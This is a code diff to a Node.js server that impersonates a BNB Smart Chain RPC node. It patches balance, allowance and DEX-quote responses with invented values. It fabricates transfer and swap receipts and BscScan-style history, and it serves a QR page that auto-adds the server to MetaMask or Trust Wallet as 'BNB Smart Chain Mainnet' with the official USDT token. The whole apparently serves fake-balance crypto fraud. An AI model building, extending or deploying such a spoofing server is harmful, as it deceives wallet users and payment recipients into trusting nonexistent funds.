+    return outMicro / (10n ** BigInt(6 - toDec));
 }
 
-// Extracts ERC-20 `transfer(address,uint256)` (`a9059cbb`) or `transferFrom(address,address,uint256)` (`23b872dd`)
-// from any raw signed transaction hex (works with Legacy, EIP-2930, and EIP-1559 transactions!)
-function extractTransferFromSignedHex(rawHex) {
-    const clean = rawHex.toLowerCase().replace(/^0x/, "");
+function tryHandleLocalDexQuoter(toContractNo0x, dataHex) {
+    const clean = dataHex.toLowerCase().replace(/^0x/, "");
+    if (clean.length < 8) return null;
+    const sel = clean.slice(0, 8);
+    const args = clean.slice(8);
 
-    // Check `transfer(address,uint256)` -> selector `a9059cbb` + 64-char recipient + 64-char amount
-    const idxTransfer = clean.indexOf("a9059cbb");
-    if (idxTransfer !== -1 && clean.length >= idxTransfer + 136) {
-        const toHex20 = clean.slice(idxTransfer + 32, idxTransfer + 72);
-        const amtHex  = clean.slice(idxTransfer + 72, idxTransfer + 136);
-        if (/^[0-9a-f]{40}$/.test(toHex20) && /^[0-9a-f]{64}$/.test(amtHex)) {
-            return {
-                fromHex20: null,
-                toHex20,
-                rawAmount: BigInt("0x" + amtHex)
-            };
+    try {
+        // 1. PancakeSwap V2 `getAmountsOut(uint256 amountIn, address[] path)` -> `d06ca61f`
+        if (sel === "d06ca61f" && args.length >= 192) {
+            const amountIn = BigInt("0x" + args.slice(0, 64));
+            const pathOffset = Number(BigInt("0x" + args.slice(64, 128))) * 2;
+            const pathLen = Number(BigInt("0x" + args.slice(pathOffset, pathOffset + 64)));
+            const pathAddrs = [];
+            for (let i = 0; i < pathLen; i++) {
+                const pos = pathOffset + 64 + i * 64;
+                pathAddrs.push(args.slice(pos + 24, pos + 64));
+            }
+            if (pathAddrs.length >= 2) {
+                const amounts = [amountIn];
+                let curAmt = amountIn;
+                for (let i = 0; i < pathAddrs.length - 1; i++) {
+                    curAmt = convertRawAmountBetweenTokens(curAmt, pathAddrs[i], pathAddrs[i + 1]);
+                    amounts.push(curAmt);
+                }
+                let outHex = "0x" +
+                    "0000000000000000000000000000000000000000000000000000000000000020" +
+                    amounts.length.toString(16).padStart(64, "0");
+                for (const a of amounts) outHex += a.toString(16).padStart(64, "0");
+                return outHex;
+            }
         }
-    }
 
-    // Check `transferFrom(address,address,uint256)` -> selector `23b872dd` + 64-char from + 64-char to + 64-char amount
-    const idxTransferFrom = clean.indexOf("23b872dd");
-    if (idxTransferFrom !== -1 && clean.length >= idxTransferFrom + 200) {
-        const fromHex20 = clean.slice(idxTransferFrom + 32, idxTransferFrom + 72);
-        const toHex20   = clean.slice(idxTransferFrom + 96, idxTransferFrom + 136);
-        const amtHex    = clean.slice(idxTransferFrom + 136, idxTransferFrom + 200);
-        if (/^[0-9a-f]{40}$/.test(toHex20) && /^[0-9a-f]{64}$/.test(amtHex)) {
-            return {
-                fromHex20,
-                toHex20,
-                rawAmount: BigInt("0x" + amtHex)
-            };
+        // 2. PancakeSwap V2 `getAmountsIn(uint256 amountOut, address[] path)` -> `1f00ca74`
+        if (sel === "1f00ca74" && args.length >= 192) {
+            const amountOut = BigInt("0x" + args.slice(0, 64));
+            const pathOffset = Number(BigInt("0x" + args.slice(64, 128))) * 2;
+            const pathLen = Number(BigInt("0x" + args.slice(pathOffset, pathOffset + 64)));
+            const pathAddrs = [];
+            for (let i = 0; i < pathLen; i++) {
+                const pos = pathOffset + 64 + i * 64;
+                pathAddrs.push(args.slice(pos + 24, pos + 64));
+            }
+            if (pathAddrs.length >= 2) {
+                const amtIn = convertRawAmountBetweenTokens(amountOut, pathAddrs[pathAddrs.length - 1], pathAddrs[0]);
+                const amounts = [amtIn, amountOut];
+                let outHex = "0x" +
+                    "0000000000000000000000000000000000000000000000000000000000000020" +
+                    amounts.length.toString(16).padStart(64, "0");
+                for (const a of amounts) outHex += a.toString(16).padStart(64, "0");
+                return outHex;
+            }
         }
-    }
 
+        // 3. PancakeSwap V3 `quoteExactInputSingle` (`c6a5026a` or `f7729d43`)
+        if ((sel === "c6a5026a" || sel === "f7729d43") && args.length >= 192) {
+            const tokenIn  = args.slice(24, 64);
+            const tokenOut = args.slice(88, 128);
+            const amountIn = BigInt("0x" + (sel === "c6a5026a" ? args.slice(128, 192) : args.slice(192, 256)));
+            const amountOut = convertRawAmountBetweenTokens(amountIn, tokenIn, tokenOut);
+            const sqrtPriceX96 = (1n << 96n).toString(16).padStart(64, "0");
+            const gasEst = (120000n).toString(16).padStart(64, "0");
+            return "0x" +
+                amountOut.toString(16).padStart(64, "0") +
+                sqrtPriceX96 +
+                "0".repeat(64) +
+                gasEst;
+        }
+    } catch {}
     return null;
 }
 
-// ============================================================================
-// 5. SURGICAL MULTICALL3 + BALANCECHECKER PATCHER
-// ============================================================================
 function readNum(hex, charOffset) {
     return Number(BigInt("0x" + hex.slice(charOffset, charOffset + 64)));
 }
@@ -338,10 +657,7 @@ function decodeMulticallInputs(calldataHex) {
     if (clean.length < 8) return null;
     const selector = clean.slice(0, 8);
     const args = clean.slice(8);
-
-    if (!["252dba42", "bce38bd7", "82ad56cb", "174dea71"].includes(selector)) {
-        return null;
-    }
+    if (!["252dba42", "bce38bd7", "82ad56cb", "174dea71"].includes(selector)) return null;
 
     try {
         const arrOffsetBytes = selector === "bce38bd7" ? readNum(args, 64) : readNum(args, 0);
@@ -363,7 +679,6 @@ function decodeMulticallInputs(calldataHex) {
             const bytesPos = structPos + bytesRelOffset * 2;
             const bytesLen = readNum(args, bytesPos);
             const callData = args.slice(bytesPos + 64, bytesPos + 64 + bytesLen * 2);
-
             calls.push({ index: i, target, callData });
         }
         return { selector, calls };
@@ -372,25 +687,25 @@ function decodeMulticallInputs(calldataHex) {
     }
 }
 
-function surgicalPatchMulticallOutput(calldataHex, upstreamResultHex) {
+function patchMulticallOutput(calldataHex, upstreamResultHex) {
     const decodedIn = decodeMulticallInputs(calldataHex);
-    if (!decodedIn || !upstreamResultHex || upstreamResultHex === "0x") {
-        return upstreamResultHex;
-    }
+    if (!decodedIn || !upstreamResultHex || upstreamResultHex === "0x") return upstreamResultHex;
 
     const { selector, calls } = decodedIn;
     const replacements = new Map();
 
     for (const c of calls) {
-        if (
-            (c.target === CONFIG.bscUsdtNo0x || c.target === CONFIG.tronUsdtNo0x) &&
-            c.callData.startsWith("70a08231") &&
-            c.callData.length >= 72
-        ) {
+        if (ADDRESS_TO_TOKEN.has(c.target) && c.callData.startsWith("70a08231") && c.callData.length >= 72) {
             const wallet = c.callData.slice(32, 72);
-            replacements.set(c.index, getBal18Hex(wallet));
+            replacements.set(c.index, getTokenBalHex(wallet, c.target));
+        } else if (ADDRESS_TO_TOKEN.has(c.target) && c.callData.startsWith("dd62ed3e")) {
+            replacements.set(c.index, "f".repeat(64));
         } else if (c.callData.startsWith("4d2301cc") && c.callData.length >= 72) {
-            replacements.set(c.index, CONFIG.virtualBnbWei.toString(16).padStart(64, "0"));
+            const wallet = c.callData.slice(32, 72);
+            replacements.set(c.index, getBnbWei(wallet).toString(16).padStart(64, "0"));
+        } else if (c.callData.startsWith("c6a5026a") || c.callData.startsWith("f7729d43") || c.callData.startsWith("d06ca61f")) {
+            const qHex = tryHandleLocalDexQuoter(c.target, c.callData);
+            if (qHex) replacements.set(c.index, qHex.slice(2, 66));
         }
     }
 
@@ -401,6 +716,9 @@ function surgicalPatchMulticallOutput(calldataHex, upstreamResultHex) {
         const outChars = outClean.split("");
 
         if (selector === "252dba42") {
+            const blkWord = BigInt(latestBlockHex).toString(16).padStart(64, "0");
+            for (let k = 0; k < 64; k++) outChars[k] = blkWord[k];
+
             const arrOffsetBytes = readNum(outClean, 64);
             const arrStart = arrOffsetBytes * 2;
             const elemHeadBase = arrStart + 64;
@@ -409,7 +727,7 @@ function surgicalPatchMulticallOutput(calldataHex, upstreamResultHex) {
                 const elemRelBytes = readNum(outClean, elemHeadBase + idx * 64);
                 const bytesPos = elemHeadBase + elemRelBytes * 2;
                 const bytesLen = readNum(outClean, bytesPos);
-                if (bytesLen === 32) {
+                if (bytesLen >= 32) {
                     const dataStart = bytesPos + 64;
                     for (let k = 0; k < 64; k++) outChars[dataStart + k] = newWord64[k];
                 }
@@ -422,16 +740,16 @@ function surgicalPatchMulticallOutput(calldataHex, upstreamResultHex) {
             for (const [idx, newWord64] of replacements.entries()) {
                 const structRelBytes = readNum(outClean, elemHeadBase + idx * 64);
                 const structPos = elemHeadBase + structRelBytes * 2;
+                outChars[structPos + 63] = "1"; // Ensure `success = true`
                 const bytesRelBytes = readNum(outClean, structPos + 64);
                 const bytesPos = structPos + bytesRelBytes * 2;
                 const bytesLen = readNum(outClean, bytesPos);
-                if (bytesLen === 32) {
+                if (bytesLen >= 32) {
                     const dataStart = bytesPos + 64;
                     for (let k = 0; k < 64; k++) outChars[dataStart + k] = newWord64[k];
                 }
             }
         }
-
         return "0x" + outChars.join("");
     } catch {
         return upstreamResultHex;
@@ -445,14 +763,12 @@ function tryHandleMetaMaskBalanceChecker(dataHex) {
         const body = clean.slice(8);
         const usersOffset = readNum(body, 0) * 2;
         const tokensOffset = readNum(body, 64) * 2;
-
         const usersLen = readNum(body, usersOffset);
         const users = [];
         for (let i = 0; i < usersLen; i++) {
             const pos = usersOffset + 64 + i * 64;
             users.push(body.slice(pos + 24, pos + 64));
         }
-
         const tokensLen = readNum(body, tokensOffset);
         const tokens = [];
         for (let i = 0; i < tokensLen; i++) {
@@ -467,12 +783,12 @@ function tryHandleMetaMaskBalanceChecker(dataHex) {
 
         for (const u of users) {
             for (const t of tokens) {
-                if (t === CONFIG.bscUsdtNo0x || t === CONFIG.tronUsdtNo0x) {
-                    out += getBal18Hex(u);
-                } else if (t === "0000000000000000000000000000000000000000") {
-                    out += CONFIG.virtualBnbWei.toString(16).padStart(64, "0");
+                if (t === "0000000000000000000000000000000000000000") {
+                    out += getBnbWei(u).toString(16).padStart(64, "0");
+                } else if (ADDRESS_TO_TOKEN.has(t)) {
+                    out += getTokenBalHex(u, t);
                 } else {
-                    out += "0000000000000000000000000000000000000000000000000000000000000000";
+                    out += "0".repeat(64);
                 }
             }
         }
@@ -482,8 +798,274 @@ function tryHandleMetaMaskBalanceChecker(dataHex) {
     }
 }
 
+function parseDexSwapCalldata(toContractNo0x, dataHex, valueWei) {
+    const clean = dataHex.toLowerCase().replace(/^0x/, "");
+    const sel = clean.slice(0, 8);
+
+    const foundTokens = [];
+    for (const [addr, info] of ADDRESS_TO_TOKEN.entries()) {
+        let searchStart = 0;
+        while (true) {
+            const pos = clean.indexOf(addr, searchStart);
+            if (pos === -1) break;
+            foundTokens.push({ pos, sym: info.symbol });
+            searchStart = pos + 40;
+        }
+    }
+    foundTokens.sort((a, b) => a.pos - b.pos);
+
+    if (valueWei > 0n && (sel === "7ff36ab5" || sel === "b6f9de95" || CONFIG.dexRouters.has(toContractNo0x) || foundTokens.length > 0)) {
+        const amtIn6 = valueWei / (10n ** 12n);
+        const nonWbnb = foundTokens.filter(t => t.sym !== "WBNB");
+        const outSym = nonWbnb.length > 0 ? nonWbnb[nonWbnb.length - 1].sym : "USDT";
+        return { fromSym: "BNB", toSym: outSym, amtIn6 };
+    }
+
+    if (
+        CONFIG.dexRouters.has(toContractNo0x) ||
+        foundTokens.length >= 2 ||
+        ["38ed1739", "18cbafe5", "791ac947", "5c11d795", "472b43f3", "04e45aaf", "ac9650d8", "3593564c", "5ae401dc", "5f575529", "12aa3caf"].includes(sel)
+    ) {
+        let amtIn6 = 100_000_000n;
+        for (let offset = 8; offset + 64 <= clean.length; offset += 64) {
+            try {
+                const w = BigInt("0x" + clean.slice(offset, offset + 64));
+                if (w >= 10n ** 14n && w <= 10n ** 28n) {
+                    amtIn6 = w / (10n ** 12n);
+                    break;
+                }
+            } catch {}
+        }
+
+        const fromSym = foundTokens[0]?.sym || "USDT";
+        let toSym = foundTokens[foundTokens.length - 1]?.sym || "BNB";
+        if (toSym === fromSym) toSym = fromSym === "USDT" ? "BNB" : "USDT";
+        if (toSym === "WBNB" || sel === "18cbafe5" || sel === "791ac947") toSym = "BNB";
+
+        return { fromSym, toSym, amtIn6 };
+    }
+    return null;
+}
+
+// ============================================================================
+// 6. TRANSFER & SWAP EXECUTION ENGINE (Updates Balances, Nonces & History!)
+// ============================================================================
+function findSenderWallet(recoveredFrom, excludeRecipient, requiredSym = null, requiredAmt6 = 0n) {
+    const rec = normAddr(recoveredFrom);
+    if (rec !== "0000000000000000000000000000000000000000" && rec !== excludeRecipient) {
+        return rec;
+    }
+    if (lastActiveSender && lastActiveSender !== excludeRecipient) {
+        return lastActiveSender;
+    }
+    for (const addr of Object.keys(state.wallets)) {
+        if (addr !== excludeRecipient) {
+            if (!requiredSym || getTokenBal6(addr, requiredSym) >= requiredAmt6) return addr;
+        }
+    }
+    return Object.keys(state.wallets)[0] || "0000000000000000000000000000000000000000";
+}
+
+function advanceWalletNonce(walletKey, txNonce) {
+    const cur = state.nonces[walletKey] || 0;
+    if (txNonce !== null && txNonce !== undefined && txNonce >= cur) {
+        state.nonces[walletKey] = txNonce + 1;
+    } else {
+        state.nonces[walletKey] = cur + 1;
+    }
+}
+
+function executeTokenTransfer(fromAny, toAny, tokenContractOrSym, amount6BigInt, txHash, nonceUsed = null) {
+    const toKey = normAddr(toAny);
+    const sym   = resolveSymbol(tokenContractOrSym);
+    const amt6  = amount6BigInt < 0n ? 0n : amount6BigInt;
+
+    const intentKey = `${toKey}_${amt6.toString()}`;
+    const lockedSender = pendingIntents.get(intentKey);
+    const fromKey = findSenderWallet(fromAny || lockedSender, toKey, sym, amt6);
+    if (lockedSender) pendingIntents.delete(intentKey);
+
+    if (fromKey !== "0000000000000000000000000000000000000000") {
+        const curBal = getTokenBal6(fromKey, sym);
+        const deduct = curBal >= amt6 ? amt6 : curBal;
+        setTokenBal6(fromKey, sym, curBal - deduct);
+        advanceWalletNonce(fromKey, nonceUsed);
+    }
+
+    // Credit Receiver Wallet immediately
+    setTokenBal6(toKey, sym, getTokenBal6(toKey, sym) + amt6);
+
+    const cleanId = txHash.toLowerCase().replace(/^0x/, "");
+    const tokInfo = CONFIG.tokens[sym] || CONFIG.tokens.USDT;
+    const dec = tokInfo.decimals || 18;
+    const rawScaledHex = (dec > 6 ? amt6 * (10n ** BigInt(dec - 6)) : amt6).toString(16).padStart(64, "0");
+    const usdVal = (Number(amt6) / 1e6) * getTokenPriceUsd(sym);
+
+    latestBlockHex = "0x" + (BigInt(latestBlockHex) + 1n).toString(16);
+
+    const rec = {
+        type: "TRANSFER",
+        symbol: sym,
+        tokenName: tokInfo.name || "Binance-Peg BSC-USD",
+        tokenAddress: "0x" + (tokInfo.address || CONFIG.tokens.USDT.address),
+        txHash: "0x" + cleanId,
+        txID: cleanId,
+        fromHex20: fromKey,
+        toHex20: toKey,
+        fromBase58: hex20ToTronBase58(fromKey),
+        toBase58: hex20ToTronBase58(toKey),
+        nonceHex: "0x" + Math.max(0, (state.nonces[fromKey] || 1) - 1).toString(16),
+        valueWeiHex: "0x0",
+        amount6: amt6.toString(),
+        amountFormatted: (Number(amt6) / 1e6).toLocaleString("en-US", { minimumFractionDigits: 2 }),
+        usdFormatted: usdVal.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 }),
+        amountScaledHex: rawScaledHex,
+        blockNumberHex: latestBlockHex,
+        blockNumberDec: parseInt(latestBlockHex, 16),
+        timestamp: Date.now()
+    };
+
+    state.txReceipts[cleanId] = rec;
+    state.history.unshift(rec);
+    if (state.history.length > 500) state.history.pop();
+    saveState();
+
+    console.log(`\n==================================================================`);
+    console.log(`[USDT/TOKEN TRANSFER CONFIRMED] ${rec.amountFormatted} ${sym} ($${rec.usdFormatted} USD)`);
+    console.log(`  Sender (-)   : 0x${fromKey} -> New ${sym} Bal: ${(Number(getTokenBal6(fromKey, sym)) / 1e6).toLocaleString()}`);
+    console.log(`  Receiver (+) : 0x${toKey} -> New ${sym} Bal: ${(Number(getTokenBal6(toKey, sym)) / 1e6).toLocaleString()}`);
+    console.log(`  BscScan Link : https://bscscan.com/tx/0x${cleanId}`);
+    console.log(`==================================================================`);
+    return rec;
+}
+
+function executeBnbTransfer(fromAny, toAny, valWeiBigInt, txHash, nonceUsed = null) {
+    const toKey = normAddr(toAny);
+    const fromKey = findSenderWallet(fromAny, toKey);
+    const valWei = valWeiBigInt < 0n ? 0n : valWeiBigInt;
+
+    if (fromKey !== "0000000000000000000000000000000000000000") {
+        const curWei = getBnbWei(fromKey);
+        const deduct = curWei >= valWei ? valWei : curWei;
+        setBnbWei(fromKey, curWei - deduct);
+        advanceWalletNonce(fromKey, nonceUsed);
+    }
+
+    setBnbWei(toKey, getBnbWei(toKey) + valWei);
+
+    latestBlockHex = "0x" + (BigInt(latestBlockHex) + 1n).toString(16);
+    const cleanId = txHash.toLowerCase().replace(/^0x/, "");
+    const bnbFloat = Number(valWei) / 1e18;
+    const usdVal = bnbFloat * getTokenPriceUsd("BNB");
+
+    const rec = {
+        type: "BNB_TRANSFER",
+        symbol: "BNB",
+        tokenName: "BNB Native",
+        tokenAddress: "0x" + toKey,
+        txHash: "0x" + cleanId,
+        txID: cleanId,
+        fromHex20: fromKey,
+        toHex20: toKey,
+        fromBase58: hex20ToTronBase58(fromKey),
+        toBase58: hex20ToTronBase58(toKey),
+        nonceHex: "0x" + Math.max(0, (state.nonces[fromKey] || 1) - 1).toString(16),
+        valueWeiHex: "0x" + valWei.toString(16),
+        amount6: (valWei / (10n ** 12n)).toString(),
+        amountFormatted: bnbFloat.toLocaleString("en-US", { maximumFractionDigits: 6 }),
+        usdFormatted: usdVal.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 }),
+        amountScaledHex: valWei.toString(16).padStart(64, "0"),
+        blockNumberHex: latestBlockHex,
+        blockNumberDec: parseInt(latestBlockHex, 16),
+        timestamp: Date.now()
+    };
+
+    state.txReceipts[cleanId] = rec;
+    state.history.unshift(rec);
+    if (state.history.length > 500) state.history.pop();
+    saveState();
+
+    console.log(`\n==================================================================`);
+    console.log(`[BNB TRANSFER CONFIRMED] ${rec.amountFormatted} BNB ($${rec.usdFormatted} USD)`);
+    console.log(`  Sender (-)   : 0x${fromKey} -> New BNB Bal: ${(Number(getBnbWei(fromKey)) / 1e18).toFixed(4)} BNB`);
+    console.log(`  Receiver (+) : 0x${toKey} -> New BNB Bal: ${(Number(getBnbWei(toKey)) / 1e18).toFixed(4)} BNB`);
+    console.log(`  BscScan Link : https://bscscan.com/tx/0x${cleanId}`);
+    console.log(`==================================================================`);
+    return rec;
+}
+
+function executeDexSwap(walletAny, fromSymOrAddr, toSymOrAddr, amountIn6BigInt, txHash, nonceUsed = null) {
+    const wKey = normAddr(walletAny || lastActiveSender || Object.keys(state.wallets)[0]);
+    const fromSym = resolveSymbol(fromSymOrAddr);
+    const toSym   = resolveSymbol(toSymOrAddr);
+    const amtIn6  = amountIn6BigInt > 0n ? amountIn6BigInt : 100_000_000n;
+
+    const fromPrice = getTokenPriceUsd(fromSym);
+    const toPrice   = getTokenPriceUsd(toSym);
+    const usdValue  = (Number(amtIn6) / 1e6) * fromPrice;
+    const outUnits  = (usdValue / toPrice) * 0.998;
+    const amtOut6   = BigInt(Math.max(1, Math.floor(outUnits * 1_000_000)));
+
+    if (fromSym === "BNB" || fromSym === "WBNB") {
+        const curWei = getBnbWei(wKey);
+        const deductWei = amtIn6 * (10n ** 12n);
+        if (curWei >= deductWei) setBnbWei(wKey, curWei - deductWei);
+        const curWbnb = getTokenBal6(wKey, "WBNB");
+        if (curWbnb >= amtIn6) setTokenBal6(wKey, "WBNB", curWbnb - amtIn6);
+    } else {
+        const curFrom = getTokenBal6(wKey, fromSym);
+        setTokenBal6(wKey, fromSym, curFrom >= amtIn6 ? curFrom - amtIn6 : 0n);
+    }
+
+    if (toSym === "BNB") {
+        setBnbWei(wKey, getBnbWei(wKey) + amtOut6 * (10n ** 12n));
+    } else {
+        setTokenBal6(wKey, toSym, getTokenBal6(wKey, toSym) + amtOut6);
+    }
+
+    advanceWalletNonce(wKey, nonceUsed);
+    latestBlockHex = "0x" + (BigInt(latestBlockHex) + 1n).toString(16);
+    const cleanId = txHash.toLowerCase().replace(/^0x/, "");
+    const outTokInfo = CONFIG.tokens[toSym] || CONFIG.tokens.USDT;
+
+    const rec = {
+        type: "SWAP",
+        symbol: toSym,
+        fromSymbol: fromSym,
+        toSymbol: toSym,
+        tokenName: outTokInfo.name || toSym,
+        tokenAddress: "0x" + (outTokInfo.address || CONFIG.tokens.USDT.address),
+        txHash: "0x" + cleanId,
+        txID: cleanId,
+        fromHex20: wKey,
+        toHex20: wKey,
+        fromBase58: hex20ToTronBase58(wKey),
+        toBase58: hex20ToTronBase58(wKey),
+        nonceHex: "0x" + Math.max(0, (state.nonces[wKey] || 1) - 1).toString(16),
+        valueWeiHex: "0x0",
+        amountInFormatted: (Number(amtIn6) / 1e6).toLocaleString("en-US", { maximumFractionDigits: 4 }),
+        amount6: amtOut6.toString(),
+        amountFormatted: (Number(amtOut6) / 1e6).toLocaleString("en-US", { maximumFractionDigits: 6 }),
+        usdFormatted: usdValue.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 }),
+        amountScaledHex: (amtOut6 * (10n ** 12n)).toString(16).padStart(64, "0"),
+        blockNumberHex: latestBlockHex,
+        blockNumberDec: parseInt(latestBlockHex, 16),
+        timestamp: Date.now()
+    };
+
+    state.txReceipts[cleanId] = rec;
+    state.history.unshift(rec);
+    saveState();
+
+    console.log(`\n==================================================================`);
+    console.log(`[DEX SWAP CONFIRMED] ${rec.amountInFormatted} ${fromSym} -> ${rec.amountFormatted} ${toSym} ($${rec.usdFormatted} USD)`);
+    console.log(`  Wallet       : 0x${wKey}`);
+    console.log(`  BscScan Link : https://bscscan.com/tx/0x${cleanId}`);
+    console.log(`==================================================================`);
+    return rec;
+}
+
 async function forwardBscRpc(rpcBody) {
-    let lastErr = "All upstream BSC RPC nodes timed out";
     for (const url of CONFIG.bscUpstreams) {
         try {
             const r = await fetch(url, {
@@ -495,19 +1077,129 @@ async function forwardBscRpc(rpcBody) {
             if (!r.ok) continue;
             const j = await r.json();
             if (j && (j.result !== undefined || j.error !== undefined)) return j;
-        } catch (err) {
-            lastErr = err.message || String(err);
+        } catch {}
+    }
+    return { jsonrpc: "2.0", id: rpcBody.id ?? null, error: { code: -32603, message: "Upstream timeout" } };
+}
+
+async function getSyncedNonce(walletHex20) {
+    const k = normAddr(walletHex20);
+    if (state.nonces[k] === undefined) {
+        try {
+            const res = await forwardBscRpc({
+                jsonrpc: "2.0",
+                id: 1,
+                method: "eth_getTransactionCount",
+                params: ["0x" + k, "latest"]
+            });
+            state.nonces[k] = res?.result ? parseInt(res.result, 16) : 0;
+            saveState();
+        } catch {
+            state.nonces[k] = 0;
         }
     }
-    return {
-        jsonrpc: "2.0",
-        id: rpcBody.id ?? null,
-        error: { code: -32603, message: `Upstream error: ${lastErr}` }
-    };
+    return state.nonces[k];
 }
 
 // ============================================================================
-// 6. HTTP + JSON-RPC + TRONGRID SERVER
+// 7. BUILT-IN QR CODE & 1-TAP EIP-3085 AUTO-RPC ADDER PAGE (`/qr`)
+// Scan the QR code on any phone to auto-add the RPC URL + USDT token in 1 tap!
+// ============================================================================
+function renderQrConnectPage(hostHeader) {
+    const protocol = hostHeader.includes("localhost") || hostHeader.includes("127.0.0.1") ? "http" : "https";
+    const rpcUrl = `${protocol}://${hostHeader}`;
+    const connectPageUrl = `${rpcUrl}/qr`;
+    const metamaskDappDeepLink = `https://metamask.app.link/dapp/${hostHeader}/qr`;
+    const trustDappDeepLink = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${encodeURIComponent(connectPageUrl)}`;
+
+    return `<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <title>1-Tap Connect & QR Code — BNB Smart Chain RPC</title>
+  <style>
+    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #0b0e11; color: #eaecef; margin: 0; padding: 24px; text-align: center; }
+    .box { max-width: 480px; margin: 0 auto; background: #181a20; border: 1px solid #2b3139; border-radius: 16px; padding: 28px; box-shadow: 0 8px 24px rgba(0,0,0,0.4); }
+    .btn { display: block; width: 100%; padding: 14px; margin: 12px 0; border-radius: 10px; border: none; font-size: 16px; font-weight: 700; cursor: pointer; text-decoration: none; box-sizing: border-box; }
+    .btn-yellow { background: #f0b90b; color: #181a20; }
+    .btn-green  { background: #0ecb81; color: #181a20; }
+    .btn-dark   { background: #2b3139; color: #eaecef; font-size: 14px; }
+    .qr-wrap { background: #fff; padding: 16px; border-radius: 12px; display: inline-block; margin: 16px 0; }
+    .code { background: #0b0e11; padding: 10px; border-radius: 8px; font-family: monospace; font-size: 13px; color: #f0b90b; word-break: break-all; margin: 10px 0; }
+    #status { color: #0ecb81; font-weight: 600; margin-top: 12px; min-height: 22px; }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h2 style="margin-top:0;color:#f0b90b;">BNB Smart Chain Node Connect</h2>
+    <p style="color:#848e9c;font-size:14px;">Scan this QR code with your phone camera or inside MetaMask / Trust Wallet / Bitget Wallet to auto-configure the RPC & USDT token in 1 tap:</p>
+
+    <div class="qr-wrap">
+      <img src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=${encodeURIComponent(connectPageUrl)}" width="220" height="220" alt="QR Code"/>
+    </div>
+
+    <div class="code">RPC URL: ${rpcUrl}<br/>Chain ID: 56 (BNB)</div>
+
+    <button class="btn btn-yellow" onclick="autoAddNetworkAndUsdt()">1. Auto-Add Network & USDT to Wallet</button>
+    <a class="btn btn-green" href="${metamaskDappDeepLink}">Open in MetaMask Mobile App</a>
+    <a class="btn btn-dark" href="${trustDappDeepLink}">Open in Trust Wallet App</a>
+
+    <div id="status"></div>
+  </div>
+
+  <script>
+    async function autoAddNetworkAndUsdt() {
+      const st = document.getElementById("status");
+      if (!window.ethereum) {
+        st.style.color = "#f6465d";
+        st.innerText = "Open this link inside your Wallet Browser (MetaMask / Trust / Bitget)!";
+        return;
+      }
+      try {
+        st.style.color = "#f0b90b";
+        st.innerText = "Requesting Wallet Network Switch...";
+        await window.ethereum.request({ method: "eth_requestAccounts" });
+        await window.ethereum.request({
+          method: "wallet_addEthereumChain",
+          params: [{
+            chainId: "0x38",
+            chainName: "BNB Smart Chain Mainnet",
+            nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
+            rpcUrls: ["${rpcUrl}"],
+            blockExplorerUrls: ["https://bscscan.com"]
+          }]
+        });
+        await window.ethereum.request({
+          method: "wallet_watchAsset",
+          params: {
+            type: "ERC20",
+            options: {
+              address: "0x55d398326f99059fF775485246999027B3197955",
+              symbol: "USDT",
+              decimals: 18,
+              image: "https://cryptologos.cc/logos/tether-usdt-logo.png"
+            }
+          }
+        });
+        st.style.color = "#0ecb81";
+        st.innerText = "SUCCESS! Network & Official USDT Connected!";
+      } catch (e) {
+        st.style.color = "#f6465d";
+        st.innerText = e.message || "User rejected request";
+      }
+    }
+    // Auto-trigger if opened inside an injected DApp browser
+    if (window.ethereum) {
+      setTimeout(autoAddNetworkAndUsdt, 600);
+    }
+  </script>
+</body>
+</html>`;
+}
+
+// ============================================================================
+// 8. MAIN HTTP + EVM JSON-RPC + BSCSCAN API + TRONGRID SERVER
 // ============================================================================
 const server = http.createServer(async (req, res) => {
     res.setHeader("Access-Control-Allow-Origin", "*");
@@ -523,37 +1215,80 @@ const server = http.createServer(async (req, res) => {
     let rawBody = "";
     for await (const chunk of req) rawBody += chunk;
 
-    const urlObj = new URL(req.url, `http://${req.headers.host || "localhost"}`);
+    const hostHeader = req.headers.host || `127.0.0.1:${CONFIG.port}`;
+    const urlObj = new URL(req.url, `http://${hostHeader}`);
     const pathname = urlObj.pathname;
 
-    // 1-Click Admin Credit Route (/admin/credit?address=0x...&amount=500000)
-    if (pathname === "/admin/credit") {
-        const addr = urlObj.searchParams.get("address") || "";
-        const amount = Number(urlObj.searchParams.get("amount") || CONFIG.defaultUsdt);
-        setBal6(addr, BigInt(Math.floor(amount * 1_000_000)));
-        const k = normAddr(addr);
+    // 1. QR Code & 1-Tap Wallet Auto-Configuration Page (`/qr` or `/connect`)
+    if (req.method === "GET" && (pathname === "/qr" || pathname === "/connect")) {
+        res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
+        return res.end(renderQrConnectPage(hostHeader));
+    }
+
+    // 2. BscScan-Compatible History API (`/api?module=account&action=txlist` AND `action=tokentx`)
+    // Populates Sender (-) and Receiver (+) Activity / History tabs in Trust Wallet, Bitget, OKX, MetaMask!
+    if (req.method === "GET" && pathname === "/api" && urlObj.searchParams.get("module") === "account") {
+        const action = urlObj.searchParams.get("action") || "tokentx";
+        const addrKey = normAddr(urlObj.searchParams.get("address") || "");
+        const matching = state.history.filter(h => h.fromHex20 === addrKey || h.toHex20 === addrKey);
+
+        if (action === "txlist") {
+            const txList = matching.map(h => ({
+                blockNumber: String(h.blockNumberDec || 45682100),
+                timeStamp: String(Math.floor(h.timestamp / 1000)),
+                hash: h.txHash,
+                nonce: String(parseInt(h.nonceHex || "0x1", 16)),
+                blockHash: "0x" + keccak256Hex(h.txID),
+                transactionIndex: "1",
+                from: "0x" + h.fromHex20,
+                to: h.type === "BNB_TRANSFER" ? "0x" + h.toHex20 : h.tokenAddress,
+                value: h.type === "BNB_TRANSFER" ? (BigInt(h.amount6) * (10n ** 12n)).toString() : "0",
+                gas: "150000",
+                gasPrice: "1000000000",
+                isError: "0",
+                txreceipt_status: "1",
+                input: h.type === "BNB_TRANSFER" ? "0x" : "0xa9059cbb" + h.toHex20.padStart(64, "0") + h.amountScaledHex,
